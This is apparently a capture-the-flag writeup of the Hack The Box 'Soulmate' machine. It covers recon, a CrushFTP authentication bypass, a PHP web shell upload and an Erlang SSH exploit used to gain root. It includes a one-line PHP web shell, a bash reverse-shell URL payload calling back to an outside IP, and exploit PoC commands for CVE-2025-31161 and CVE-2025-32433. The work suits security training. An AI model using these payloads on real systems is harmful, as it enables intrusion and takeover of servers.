---
layout: post
title: "HTB - Soulmate"
date: 2025-09-08 10:00:00 +0000
locked: false
collection: writeups
tags: [htb, writeup, soulmate, soulmate htb, htb soulmate, htb soulmate writeup, soulmate htb writeup, linux, web-exploitation, php, file-upload, ssh, crushftp, vulnerability-exploit, privilege-escalation, root-access]
image: "/assets/images/thumbnails/htb/ctf/soulmate/thumbnail.png"
description: "Hacking really is love at first sight"
author: "SoftAndoWetto"
---

# Details
```
IP: 10.10.11.86
Difficulty: Easy
Platform: Linux
```
<br><br>

# Recon

The first step is an Nmap scan to see which services are exposed: 
<br>
`nmap -sC -sV 10.10.11.86 -oA Soulmate_NMAP`

```
Nmap scan report for 10.10.11.86
Host is up (0.032s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   30.73 ms 10.10.14.1
2   27.15 ms 10.10.11.86

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep  7 19:48:49 2025 -- 1 IP address (1 host up) scanned in 11.97 seconds
```
<br><br>
And we get port 80 being open, with a redirect to **soulmate.htb** so its time to add that to /etc/hosts

![main webpage](/assets/images/thumbnails/htb/ctf/soulmate/webpage.png)

<br><br>
From there I see the option to make an account with the option to upload a profile picture image.

![Image of account creation](/assets/images/thumbnails/htb/ctf/soulmate/signup.png)

<br><br>
So naturally I open burpsuite and see the post request that its making

![Burpsuite](/assets/images/thumbnails/htb/ctf/soulmate/burpsuite.png)

<br><br>

# Directory and Vhost Discovery

And experiment with uploading things that should be there, and pretty easily find that you can change the content type and upload a PHP file (Keep this in mind for later)

<br>
Then from there i run:
- Feroxbuster to find directories
- ffuf for subdomains and vhosts

![FFUF screenshot](/assets/images/thumbnails/htb/ctf/soulmate/ffuf_vhost.png)

<br><br>
and I find a vhost at
`ftp.soulmate.htb`

So we also add this too /etc/hosts

![CrushFTP Image](/assets/images/thumbnails/htb/ctf/soulmate/ftp_vhost.png)

<br><br>

# CrushFTP Exploit (CVE-2025-31161)

From there we can see that theyre using CrushFTP and although I wasnt able to find out what version, I did come across a recent CVE for this application (CVE-2025-31161) which:

By knowing a valid username (like crushadmin), an attacker can trick the server into logging them in without a password. Once in, they can create a new user with their own password and use that for persistent access.

Then from there I found a [PoC from Immersive Labs](`https://github.com/Immersive-Labs-Sec/CVE-2025-31161`)

`python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user admin --new_user admin --password 'admin'`

<br><br>
Looking around the dashboard, I came across this page

`http://ftp.soulmate.htb/WebInterface/UserManager/index.html`

<br>
In which I was able to give myself permissions to upload to the paths listed there. with /app being the main one here

![File permissions](/assets/images/thumbnails/htb/ctf/soulmate/file_permissions.png)

<br><br>
After looking through /app I was led to `Home -> webProd -> assets -> images -> profiles` and would you know it, this is where the images get uploaded to.
And I am able to access this page, so if I upload 

`<?php system($_GET["cmd"]); ?>`

And access it with

`http://soulmate.htb/assets/images/profiles/Test1.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/10.10.14.189/4444+0%3E%261%27`



![Images directory](/assets/images/thumbnails/htb/ctf/soulmate/images_path.png)

<br><br>
`www-data@soulmate:/$` 
<br><br><br>
I get a shell

Now from here during my enumeration I come across

```
www-data@soulmate:~/soulmate.htb/public/assets/images/profiles$ ss -tulnp
ss -tulnp
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                                 
udp   UNCONN 0      0      127.0.0.53%lo:53         0.0.0.0:*                                                           
tcp   LISTEN 0      4096       127.0.0.1:8443       0.0.0.0:*                                                           
tcp   LISTEN 0      5          127.0.0.1:2222       0.0.0.0:*                                                           
tcp   LISTEN 0      4096         0.0.0.0:4369       0.0.0.0:*                                                           
tcp   LISTEN 0      128        127.0.0.1:33161      0.0.0.0:*                                                           
tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*    users:(("nginx",pid=1125,fd=8),("nginx",pid=1124,fd=8))
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                                           
tcp   LISTEN 0      4096       127.0.0.1:9090       0.0.0.0:*                                                           
tcp   LISTEN 0      4096       127.0.0.1:42495      0.0.0.0:*                                                           
tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*                                                           
tcp   LISTEN 0      4096       127.0.0.1:8080       0.0.0.0:*                                                           
tcp   LISTEN 0      4096            [::]:4369          [::]:*                                                           
tcp   LISTEN 0      511             [::]:80            [::]:*    users:(("nginx",pid=1125,fd=9),("nginx",pid=1124,fd=9))
tcp   LISTEN 0      128             [::]:22            [::]:*                                                           
www-data@soulmate:~/soulmate.htb/public/assets/images/profiles$ nc 127.0.0.1 2222  
<tb/public/assets/images/profiles$ nc 127.0.0.1 2222            
SSH-2.0-Erlang/5.2.9
```

<br><br>
With an ssh server running locally on port 2222
I searched for vulnerabilities affecting Erlang SSH.

`https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC/blob/main/cve-2025-32433.py`

`python3 cve-2025-32433.py 127.0.0.1 -p 2222 --shell --lhost 10.10.14.189 --lport 6666`

```
whoami
root
```

<br><br>
and we're done! (I promise you this isnt a TTY, I didnt just write this)

<br>

# Conclusion / TL;DR

- **Recon**: Nmap revealed SSH (22) and HTTP (80) with a redirect to soulmate.htb.
<br><br>

- **Web app**: Account creation with an insecure image upload allowed PHP files.
<br><br>

- **Discovery**: ffuf found ftp.soulmate.htb, running CrushFTP.
<br><br>

- **Exploit**: Used CVE-2025-31161 to bypass auth and create my own account.
<br><br>

- **Persistence**: Granted myself upload permissions and dropped a PHP webshell.
<br><br>

- **Enumeration**: Found Erlang SSH running on localhost port 2222.
<br><br>

- **Privilege Escalation**: Exploited CVE-2025-32433 to gain root access.
